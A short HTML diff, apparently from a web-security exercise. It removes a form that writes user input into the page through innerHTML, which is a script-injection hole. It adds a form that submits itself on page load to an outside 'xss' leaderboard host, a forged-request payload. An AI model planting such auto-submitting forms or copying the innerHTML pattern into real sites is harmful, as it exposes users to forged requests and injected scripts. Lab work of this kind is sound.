@@ -1,14 +1,6 @@
- 
-        <form action="PayslipServlet" method="post">
-          Last name:    <input type="text" name="lname" id="lname"><br/>
-
-          Name: <span id="result"></span>
-          <br>
-          <input type="button" value="Submit" onClick="pr()">
-        </form>
-
-        <script>
-          function pr() {
-            document.getElementById("result").innerHTML = document.getElementById('lname').value;
-          }
-        </script>
+    <form action="https://xss.uqcloud.net/leaderboard.php" method="POST" />
+	
+      <input type="text" name="aaabbbzzzdddkkkkkpppaaalkjdffsdgggggggggggggggggggggggggggggggggggggkl;ajfkl;asjfl;kasdfakljf" />
+      <input type=submit value="submit" />
+    </form>
+    <body onload="document.forms[0].submit()">
